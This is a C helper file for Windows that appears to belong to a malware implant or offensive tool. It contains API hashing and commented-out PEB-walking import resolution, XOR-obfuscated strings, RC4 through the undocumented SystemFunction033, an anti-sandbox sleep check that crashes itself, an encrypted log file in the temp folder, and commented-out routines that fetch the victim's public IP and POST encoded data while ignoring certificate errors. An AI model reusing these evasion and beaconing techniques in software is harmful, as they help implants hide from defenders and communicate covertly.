#include "pch.h"

UINT32 HashStringRotr32SubA
(
	_In_ UINT32 uValue,
	_In_ UINT   uCount
)
{
	DWORD Mask = (CHAR_BIT * sizeof(uValue) - 1);
	uCount &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (uValue >> uCount) | (uValue << ((-uCount) & Mask));
#pragma warning( pop ) 
}

DWORD HashStringRotr32A
(
	_In_ LPSTR s
)
{
	DWORD Value = 0;

	for (INT Index = 0; Index < lstrlenA(s); Index++)
		Value = s[Index] + HashStringRotr32SubA(Value, SEED);

	return Value;
}

//HMODULE GetModuleHandleByHash
//(
//	_In_ LPSTR ModuleName
//)
//{
//	if (ModuleName == NULL)
//		return NULL;
//
//	PPEB pPeb = (PPEB)__readgsqword(0x60);
//	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
//	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
//
//	while (pDte) {
//		if (pDte->FullDllName.Buffer != NULL) {
//			if (pDte->FullDllName.Length < MAX_PATH - 1) {
//				CHAR DllName[MAX_PATH] = { 0 };
//				DWORD i = 0;
//				while (pDte->FullDllName.Buffer[i] && i < sizeof(DllName) - 1) {
//					DllName[i] = (char)pDte->FullDllName.Buffer[i];
//					i++;
//				}
//
//				DllName[i] = '\0';
//				if (HASHA(DllName) == HASHA(ModuleName)) {
//					return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
//				}
//			}
//		}
//		else {
//			break;
//		}
//
//		pDte = (PLDR_DATA_TABLE_ENTRY)DEREF_64(pDte);
//	}
//	return NULL;
//}

UINT32 CopyDotStr
(
	_In_ PCHAR String
)
{
	for (UINT32 i = 0; i < lstrlenA(String); i++)
	{
		if (String[i] == '.')
			return i;
	}

	return 0;
}

LPCWSTR DecryptStringW
(
	_In_ PBYTE pBuffer
)
{
	SHORT c;
	INT i = 0;

	while (TRUE) {
		c = *(PSHORT)&pBuffer[i];
		c ^= 0xD1A5;
		if (c == 0) {
			break;
		}

		*(PSHORT)&pBuffer[i] = c;
		i += sizeof(WCHAR);
	}

	return (LPCWSTR)pBuffer;
}

//LPVOID GetProcAddressByHash
//(
//	_In_ HMODULE hModule,
//	_In_ DWORD   dwHash
//)
//{
//	if (hModule == NULL || dwHash == 0)
//		return NULL;
//
//	HMODULE hModule2 = NULL;
//	UINT64	DllBaseAddress = (UINT64)hModule;
//
//	PIMAGE_NT_HEADERS NtHdr = (PIMAGE_NT_HEADERS)(DllBaseAddress + ((PIMAGE_DOS_HEADER)DllBaseAddress)->e_lfanew);
//	PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
//	PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)(DllBaseAddress + pDataDir->VirtualAddress);
//
//	UINT64 FunctionNameAddressArray = (DllBaseAddress + ExportTable->AddressOfNames);
//	UINT64 FunctionAddressArray = (DllBaseAddress + ExportTable->AddressOfFunctions);
//	UINT64 FunctionOrdinalAddressArray = (DllBaseAddress + ExportTable->AddressOfNameOrdinals);
//	UINT64 pFunctionAddress = 0;
//	// UINT64 wSignature = 0;
//
//	DWORD	dwCounter = ExportTable->NumberOfNames;
//
//	while (dwCounter--) {
//		char* FunctionName = (char*)(DllBaseAddress + DEREF_32(FunctionNameAddressArray));
//
//		if (HASHA(FunctionName) == dwHash) {
//			FunctionAddressArray += (DEREF_16(FunctionOrdinalAddressArray) * sizeof(DWORD));
//			pFunctionAddress = (UINT64)(DllBaseAddress + DEREF_32(FunctionAddressArray));
//
//			if (pDataDir->VirtualAddress <= DEREF_32(FunctionAddressArray) && (pDataDir->VirtualAddress + pDataDir->Size) >= DEREF_32(FunctionAddressArray)) {
//				CHAR Library[MAX_PATH] = { 0 };
//				CHAR Function[MAX_PATH] = { 0 };
//				UINT32 Index = CopyDotStr((PCHAR)pFunctionAddress);
//				if (Index == 0) {
//					return NULL;
//				}
//
//				memcpy((PVOID)Library, (PVOID)pFunctionAddress, Index);
//				memcpy((PVOID)Function, (PVOID)((ULONG_PTR)pFunctionAddress + Index + 1), lstrlenA((LPCSTR)((ULONG_PTR)pFunctionAddress + Index + 1)));
//				if ((hModule2 = LoadLibraryA(Library)) != NULL) {
//					pFunctionAddress = (UINT64)GetProcAddressByHash(hModule2, HASHA(Function));
//				}
//			}
//			break;
//		}
//
//		FunctionNameAddressArray += sizeof(DWORD);
//		FunctionOrdinalAddressArray += sizeof(WORD);
//	}
//
//	return (LPVOID)(pFunctionAddress);
//}

UINT64 ReadQword
(
	_In_ LPVOID lpAddr
)
{
	BYTE Buffer[sizeof(UINT64)];
	UINT64 uResult = 0;
	DWORD i;
	UINT64 dwTemp;

	if (memcpy(Buffer, lpAddr, sizeof(Buffer))) {
		for (i = 0; i < _countof(Buffer); i++) {
			dwTemp = Buffer[i];
			uResult += (dwTemp << (i * 8));
		}
	}

	return uResult;
}

LPSTR* ReadEachLineA
(
	_In_  LPSTR  lpBuffer,
	_Out_ PDWORD pdwCount
)
{
	DWORD dwIdx = 0;
	DWORD dwIdxStart = 0;
	DWORD dwLength;
	CHAR szTemp[0x100];
	LPSTR* lpResult;
	DWORD dwCount = 0;

	lpResult = (LPSTR*)ALLOC(sizeof(LPSTR));

	while (lpBuffer[dwIdx] != '\0') {
		if (lpBuffer[dwIdx] == '\n') {
			dwLength = dwIdx - dwIdxStart;
			lpResult[dwCount] = (LPSTR)ALLOC(dwLength + 1);
			memcpy(lpResult[dwCount], &lpBuffer[dwIdxStart], dwLength);
			dwCount += 1;
			lpResult = (LPSTR*)REALLOC(lpResult, (dwCount + 1) * sizeof(LPSTR));
			dwIdxStart = dwIdx + 1;
		}

		dwIdx++;
	}

	*pdwCount = dwCount;
	return lpResult;
}

DWORD StrHash
(
	_In_ LPSTR s
)
{
	DWORD dwHashVal = 0;
	DWORD dwTemp = 0;

	for (DWORD i = 0; i < lstrlenA(s); i++) {
		dwHashVal = (dwHashVal << 4) + s[i];
		dwTemp = dwHashVal & 0xF0000000L;
		if (dwTemp != 0)
			dwHashVal ^= dwTemp >> 24;

		dwHashVal &= ~dwTemp;
	}

	return dwHashVal;
}

//LPSTR GetPublicIp
//(
//	_In_ HINTERNET hInternet
//)
//{
//	HANDLE hConnect = NULL;
//	HANDLE hRequest = NULL;
//	LPSTR lpResp = NULL;
//	DWORD dwRespSize = 0;
//
//	hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
//	hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
//
//	lpResp = SendRequestGetResponse(hRequest, &dwRespSize);
//
//	if (hRequest) {
//		InternetCloseHandle(hInternet);
//	}
//
//	if (hConnect) {
//		InternetCloseHandle(hConnect);
//	}
//
//	return lpResp;
//}

LPSTR Encode
(
	_In_ LPSTR lpKey,
	_In_ LPSTR lpPlainText
)
{
	LPSTR lpCipher = NULL;
	CHAR c;
	DWORD dwPlaceholder;

	lpCipher = ALLOC(lstrlenA(lpPlainText) + 1);
	for (DWORD i = 0; i < lstrlenA(lpPlainText); i++) {
		c = lpKey[i % lstrlenA(lpKey)];
		dwPlaceholder = (DWORD)(lpPlainText[i]) + (DWORD)(c);
		lpCipher[i] = (UCHAR)(dwPlaceholder % 127);
	}

	return lpCipher;
}

//LPSTR SendEncodedString
//(
//	_In_  PSTRINGS pStrings,
//	_In_  LPSTR    lpKey,
//	_In_  LPSTR    lpData,
//	_In_  LPSTR    lpEndpoint,
//	_In_  HANDLE   hConnect
//)
//{
//	LPSTR lpResult = NULL;
//	LPSTR lpBuffer = NULL;
//	LPSTR lpChunk = NULL;
//	HANDLE hRequest;
//	BOOL bReqSuccess;
//	DWORD dwReceivedData = 0;
//	DWORD dwChunkSize = 2048;
//	DWORD dwSize = 0;
//
//	lpResult = Encode(lpKey, lpData);
//	hRequest = HttpOpenRequestA(hConnect, pStrings->lpPost, lpEndpoint, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
//	bReqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)lpResult, lstrlenA(lpResult));
//	lpResult = NULL;
//
//	if (bReqSuccess) {
//		lpChunk = ALLOC(dwChunkSize);
//		lpBuffer = ALLOC(dwChunkSize);
//		while (InternetReadFile(hRequest, lpChunk, dwChunkSize, &dwReceivedData) && dwReceivedData)
//		{
//			lpBuffer = REALLOC(lpBuffer, dwSize + dwReceivedData);
//			memcpy(&lpBuffer[dwSize], lpChunk, dwReceivedData);
//			dwSize += dwReceivedData;
//		}
//
//		HttpEndRequestA(hRequest, NULL, NULL, NULL);
//		InternetCloseHandle(hRequest);
//		lpResult = Decode(lpKey, lpBuffer);
//	}
//
//	if (lpChunk != NULL) {
//		FREE(lpChunk);
//	}
//
//	if (lpBuffer != NULL) {
//		FREE(lpChunk);
//	}
//
//	HttpEndRequestA(hRequest, NULL, NULL, NULL);
//	InternetCloseHandle(hRequest);
//	return lpResult;
//}

BOOL DirectoryExists
(
	_In_ LPSTR szPath
)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsFileExists
(
	_In_ LPWSTR wszPath
)
{
	DWORD dwAttrib = GetFileAttributesW(wszPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsPathExists
(
	_In_ LPSTR lpPath
)
{
	DWORD dwAttrib = GetFileAttributesA(lpPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

VOID Decrypt
(
	_In_ PBYTE pBuffer,
	_In_ DWORD dwSize,
	_In_ LPSTR lpKey
)
{
	/*UCHAR c;
	DWORD i;

	for (i = 0; i < dwSize; i++) {
		pBuffer[i] ^= lpKey[i % lstrlenA(lpKey)];
	}*/
	return;
}

LPSTR ConvertToChar
(
	_In_  LPWSTR wszInput
)
{
	DWORD dwSize = 0;
	LPSTR lpResult = NULL;

	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, lstrlenW(wszInput), NULL, 0, NULL, NULL);
	lpResult = ALLOC(dwSize + 1);
	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, lstrlenW(wszInput), lpResult, dwSize, NULL, NULL);

	return lpResult;
}

LPWSTR ConvertToWChar
(
	_In_ LPSTR szInput
)
{
	DWORD dwSize = 0;
	LPWSTR lpResult = NULL;

	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, lstrlenA(szInput), NULL, 0);
	lpResult = ALLOC((dwSize + 1) * sizeof(WCHAR));
	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, lstrlenA(szInput), lpResult, dwSize);
	return lpResult;
}

VOID CustomSleep
(
	_In_ DWORD dwMilliseconds
)
{
	FILETIME Start, End;
	UINT64 uStart, uEnd;
	uStart = uEnd = 0;
	FLOAT Exception;

	GetSystemTimeAsFileTime(&Start);
	//uStart = ((UINT64)(Start.dwHighDateTime) << 32) | Start.dwLowDateTime;
	uStart = *(PUINT64)(&Start);
	Sleep(dwMilliseconds);
	GetSystemTimeAsFileTime(&End);
	uEnd = *(PUINT64)(&End);

	if (uEnd - uStart < 100000000) {
		Exception = (DOUBLE)1 / (uEnd - uEnd);
	}
}

PBYTE XorString
(
	_In_ LPSTR lpStr,
	_In_ DWORD dwSize,
	_In_ DWORD dwKey
)
{
	DWORD i = 0;
	DWORD j = 0;
	UINT8 c;
	PBYTE pResult = NULL;

	pResult = ALLOC(dwSize + 1);

	for (i = 0; i < dwSize; i++) {
		c = lpStr[i];
		for (j = 0; j < 32; j += 8) {
			c = c ^ ((dwKey >> j) & 0xFF);
		}

		dwKey += 1;
		pResult[i] = c;
	}

	return pResult;
}

BOOL EncryptData
(
	_In_  PBYTE  pPlaintext,
	_In_  DWORD  dwPlainSize,
	_Out_ PBYTE * pCipher,
	_Out_ PDWORD pdwCipherSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	PBYTE pKeyObj = NULL;
	DWORD dwKeyObjSize = 0;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherText = 0;
	PBYTE pResult = NULL;
	DWORD dwResultSize = 0;
	PBYTE pTempIv = NULL;

	pTempIv = ALLOC(16);
	pIv = GenRandomBytes(16);
	if (!pIv) {
		goto CLEANUP;
	}

	memcpy(pTempIv, pIv, 16);
	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_OBJECT_LENGTH, &dwKeyObjSize, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pKeyObj = ALLOC(dwKeyObjSize);
	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, pKeyObj, dwKeyObjSize, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, NULL, 0, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pCipherText = ALLOC(dwCipherText);
	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, pCipherText, dwCipherText, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	dwResultSize = dwBlockLength + dwCipherText;
	pResult = ALLOC(dwResultSize);
	memcpy(pResult, pTempIv, dwBlockLength);
	memcpy(&pResult[dwBlockLength], pCipherText, dwCipherText);

	*pCipher = pResult;
	*pdwCipherSize = dwResultSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	FREE(pIv);
	FREE(pCipherText);
	FREE(pKeyObj);

	return bResult;
}

BOOL DecryptData
(
	_In_  PBYTE  pInput,
	_In_  DWORD  dwInputSize,
	_Out_ PBYTE * pOutput,
	_Out_ PDWORD pdwOutputSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherTextSize = 0;
	PBYTE pPlainText = NULL;
	DWORD dwPlainTextSize = 0;

	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	pIv = ALLOC(dwBlockLength);
	memcpy(pIv, pInput, dwBlockLength);
	dwCipherTextSize = dwInputSize - dwBlockLength;
	pCipherText = ALLOC(dwCipherTextSize);
	memcpy(pCipherText, &pInput[dwBlockLength], dwCipherTextSize);

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, NULL, 0, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, NULL, 0, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pPlainText = ALLOC(dwPlainTextSize);
	memcpy(pIv, pInput, dwBlockLength);
	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, pPlainText, dwPlainTextSize, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	*pOutput = pPlainText;
	*pdwOutputSize = dwPlainTextSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	FREE(pIv);
	FREE(pCipherText);

	return bResult;
}

DWORD Pow
(
	_In_ DWORD dwX,
	_In_ DWORD dwY
)
{
	DWORD i;
	DWORD dwResult = 1;

	for (i = 0; i < dwY; i++) {
		dwResult *= dwX;
	}

	return dwResult;
}

VOID Rc4EncryptDecrypt
(
	_In_  PBYTE  pbBuffer,
	_In_  DWORD  dwSize,
	_In_  PBYTE  pbKey,
	_In_  DWORD  dwKeySize
)
{
	struct ustring {
		DWORD Length;
		DWORD MaximumLength;
		PVOID Buffer;
	};

	struct ustring Key = { 0 };
	struct ustring PlainText = { 0 };
	NTSTATUS Status = 0;

	typedef NTSTATUS(WINAPI* SYSTEMFUNCTION033)(struct ustring* memoryRegion, struct ustring* keyPointer);
	// fwprintf_s(f_log, L"Rc4EncryptDecrypt\n");
	SYSTEMFUNCTION033 SystemFunction033 = (SYSTEMFUNCTION033)GetProcAddress(LoadLibraryW(L"advapi32.dll"), "SystemFunction033");
	SecureZeroMemory(&Key, sizeof(Key));
	SecureZeroMemory(&PlainText, sizeof(PlainText));
	PlainText.Buffer = (PVOID)pbBuffer;
	PlainText.Length = dwSize;

	Key.Buffer = (PVOID)pbKey;
	Key.Length = dwKeySize;

	Status = SystemFunction033(&PlainText, &Key);
}

BOOL StartWith
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	CHAR c;
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (lstrlenA(lpSrc) < lstrlenA(lpPattern)) {
		return FALSE;
	}

	c = lpSrc[lstrlenA(lpPattern)];
	lpSrc[lstrlenA(lpPattern)] = '\0';
	dwCmpResult = lstrcmpA(lpSrc, lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	lpSrc[lstrlenA(lpPattern)] = c;
	return bResult;
}

BOOL EndWithA
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (lstrlenA(lpSrc) < lstrlenA(lpPattern)) {
		return FALSE;
	}

	dwCmpResult = lstrcmpA(&lpSrc[lstrlenA(lpSrc) - lstrlenA(lpPattern)], lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

BOOL EndWithW
(
	_In_ LPWSTR wszSrc,
	_In_ LPWSTR wszPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (lstrlenW(wszSrc) < lstrlenW(wszPattern)) {
		return FALSE;
	}

	dwCmpResult = lstrcmpW(&wszSrc[lstrlenW(wszSrc) - lstrlenW(wszPattern)], wszPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

VOID CustomExit(VOID) {
	DWORD dwTemp = 10;
	DWORD dwResult = 0;

	dwResult = 1 / (dwTemp - 10);
}

BOOL IsUserAdmin(VOID)
{
	BOOL bIsAdmin = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup = NULL;

	bIsAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
	if (bIsAdmin) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &bIsAdmin)) {
			bIsAdmin = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return bIsAdmin;
}

int IsPrint
(
	int c
)
{
	return (c >= 0x20 && c <= 0x7E);
}

VOID HexDump
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
)
{
	DWORD i, j;

#ifdef _DEBUG
	if (cbBuffer >= 0x400) {
		cbBuffer = 0x400;
	}

	for (i = 0; i < cbBuffer; i += 16) {
		PrintFormatA("%08x  ", i);

		for (j = 0; j < 16; j++) {
			if (i + j < cbBuffer) {
				PrintFormatA("%02x ", pBuffer[i + j]);
			}
			else {
				PrintFormatA("   ");
			}
		}

		PrintFormatA(" |");
		for (j = 0; j < 16; j++) {
			if (i + j < cbBuffer) {
				if (IsPrint(pBuffer[i + j])) {
					PrintFormatA("%c", pBuffer[i + j]);
				}
				else {
					PrintFormatA(".");
				}
			}
			else {
				PrintFormatA(" ");
			}
		}

		PrintFormatA("|\n");
	}
#endif
}

VOID LogError
(
	_In_ LPWSTR lpFormat,
	...
)
{
	va_list Args;
	LPWSTR lpBuffer = NULL;
	LPSTR lpTempBuffer = NULL;
	SYSTEMTIME SystemTime;
	WCHAR wszLogPath[MAX_PATH];
	LPSTR lpOldLog = NULL;
	DWORD cbOldLog = 0;

	SecureZeroMemory(&SystemTime, sizeof(SystemTime));
	lpBuffer = ALLOC(0x600);
	GetLocalTime(&SystemTime);
	va_start(Args, lpFormat);
	wsprintfW(lpBuffer, L"[%hu/%hu/%hu %hu:%hu:%hu] ", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
	wvsprintfW(&lpBuffer[lstrlenW(lpBuffer)], lpFormat, Args);
	PrintFormatW(L"%s", lpBuffer);
	va_end(Args);

	lpTempBuffer = ConvertWcharToChar(lpBuffer);
	if (lpTempBuffer[lstrlenA(lpTempBuffer) - 1] != '\n') {
		lpTempBuffer = StrCatExA(lpTempBuffer, "\n");
	}

	GetTempPathW(_countof(wszLogPath), wszLogPath);
	lstrcatW(wszLogPath, L"\\EL.txt");
	if (IsFileExist(wszLogPath)) {
		lpOldLog = (LPSTR)ReadFromFile(wszLogPath, &cbOldLog);
		Rc4EncryptDecrypt(lpOldLog, cbOldLog, "LogKey", lstrlenA("LogKey"));
	}

	lpOldLog = StrCatExA(lpOldLog, lpTempBuffer);
	cbOldLog = lstrlenA(lpOldLog);
	PrintFormatA("%s\n", lpTempBuffer);
	Rc4EncryptDecrypt(lpOldLog, cbOldLog, "LogKey", lstrlenA("LogKey"));
	WriteToFile(wszLogPath, lpOldLog, cbOldLog);

	SecureZeroMemory(wszLogPath, sizeof(wszLogPath));
	GetTempPathW(_countof(wszLogPath), wszLogPath);
	wsprintfW(&wszLogPath[lstrlenW(wszLogPath)], L"log_%d.txt", GetCurrentThreadId());
	if (IsFileExist(wszLogPath)) {
		WriteToFile(wszLogPath, lpTempBuffer, lstrlenA(lpTempBuffer) - 1);
	}

	FREE(lpTempBuffer);
	FREE(lpBuffer);
	FREE(lpOldLog);
#ifdef _DEBUG
	//RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);
#endif
}

PBYTE CompressBuffer
(
	_In_ PBYTE pInput,
	_In_ DWORD cbInput,
	_Out_ PDWORD pcbOutput
)
{
	/*PBYTE pResult = NULL;
	COMPRESSOR_HANDLE hCompressor = 0;

	if (!CreateCompressor(COMPRESS_ALGORITHM_LZMS, )) {
		LogError(L"CreateCompressor failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	return pResult;*/
}

VOID PrintStackTrace
(
	_In_ PCONTEXT pContext
)
{
#ifdef _DEBUG
	STACKFRAME64 StackFrame;
	HANDLE hCurrentProcess = NULL;
	PSYMBOL_INFO pSymbolInfo;
	DWORD i = 0;
	DWORD64 dwDisplacement = 0;
	IMAGEHLP_LINE64 Line;
	HMODULE hModule = NULL;
	CHAR szModulePath[0x400];

	SecureZeroMemory(&StackFrame, sizeof(StackFrame));
	hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SymInitialize(hCurrentProcess, NULL, TRUE);
	pSymbolInfo = ALLOC(sizeof(SYMBOL_INFO) + MAX_SYM_NAME);
	while (TRUE) {
		if (!StackWalk64(IMAGE_FILE_MACHINE_AMD64, hCurrentProcess, GetCurrentThread(), &StackFrame, pContext, NULL, SymFunctionTableAccess64, SymGetModuleBase64, NULL)) {
			break;
		}

		SecureZeroMemory(pSymbolInfo, sizeof(SYMBOL_INFO) + MAX_SYM_NAME);
		pSymbolInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
		pSymbolInfo->MaxNameLen = MAX_SYM_NAME;
		if (!SymFromAddr(hCurrentProcess, StackFrame.AddrPC.Offset, &dwDisplacement, pSymbolInfo)) {
			break;
		}

		SecureZeroMemory(&Line, sizeof(Line));
		Line.SizeOfStruct = sizeof(Line);
		if (SymGetLineFromAddr64(hCurrentProcess, StackFrame.AddrPC.Offset, &dwDisplacement, &Line))
		{
			PrintFormatA("\tat %s in %s: line: %lu: address: 0x%IX.\n", pSymbolInfo->Name, Line.FileName, Line.LineNumber, StackFrame.AddrPC.Offset);
		}
		else {
			PrintFormatA("\tat %s, address 0x%IX.\n", pSymbolInfo->Name, StackFrame.AddrPC.Offset);
			hModule = NULL;
			SecureZeroMemory(szModulePath, sizeof(szModulePath));
			GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPSTR)(StackFrame.AddrPC.Offset), &hModule);
			if (hModule != NULL) {
				GetModuleFileNameA(hModule, szModulePath, _countof(szModulePath));
			}

			PrintFormatA("in %s\n", szModulePath);
		}

		if (!lstrcmpA(pSymbolInfo->Name, "main")) {
			if (hCurrentProcess != NULL) {
				CloseHandle(hCurrentProcess);
				hCurrentProcess = NULL;
			}

			break;
		}
	}

	if (hCurrentProcess != NULL) {
		CloseHandle(hCurrentProcess);
	}

	FREE(pSymbolInfo);

	return;
#endif
}

LPSTR CreateFormattedErr
(
	_In_ DWORD dwErrCode,
	_In_ LPSTR lpFormat,
	...
)
{
	va_list Args;
	LPSTR lpResult = NULL;
	LPSTR lpFormattedErr = NULL;

	lpResult = ALLOC(0x1000);
	va_start(Args, lpFormat);
	wvsprintfA(lpResult, lpFormat, Args);
	va_end(Args);

	if (dwErrCode != 0) {
		lpFormattedErr = FormatErrorCode(dwErrCode);
		lpFormattedErr[lstrlenA(lpFormattedErr) - 3] = '\0';
		wsprintfA(&lpResult[lstrlenA(lpResult)], " (0x%08x: %s)", dwErrCode, lpFormattedErr);
		FREE(lpFormattedErr);
	}

	lpResult = REALLOC(lpResult, lstrlenA(lpResult) + 1);
	return lpResult;
}

LPSTR FormatErrorCode
(
	_In_ DWORD dwErrorCode
)
{
	LPSTR lpResult = NULL;
	LPSTR lpTemp = NULL;
	DWORD cchOutput = 0;

	cchOutput = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, dwErrorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), &lpTemp, 0, NULL);
	if (cchOutput == 0) {
		return NULL;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
	LocalFree(lpTemp);

	return lpResult;
}

BOOL Unzip
(
	_In_ LPWSTR lpZipPath,
	_In_ LPWSTR lpOutputPath
)
{
	BOOL Result = FALSE;
	LPWSTR lpArgs[] = { L"tar", L"-xf", NULL };
	LPSTR lpOutputArg = NULL;
	WCHAR wszWorkingDirectory[MAX_PATH];
	HANDLE hProcess = NULL;

	SecureZeroMemory(wszWorkingDirectory, sizeof(wszWorkingDirectory));
	GetCurrentDirectoryW(_countof(wszWorkingDirectory), wszWorkingDirectory);
	if (lpOutputPath != NULL && !SetCurrentDirectoryW(lpOutputPath)) {
		LOG_ERROR("SetCurrentDirectoryW", GetLastError());
		goto CLEANUP;
	}

	lpArgs[2] = lpZipPath;
	Result = Run(lpArgs, _countof(lpArgs), &hProcess);
	if (hProcess != NULL) {
		WaitForSingleObject(hProcess, INFINITE);
	}

CLEANUP:
	FREE(lpOutputArg);
	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}

	SetCurrentDirectoryW(wszWorkingDirectory);
	return Result;
}

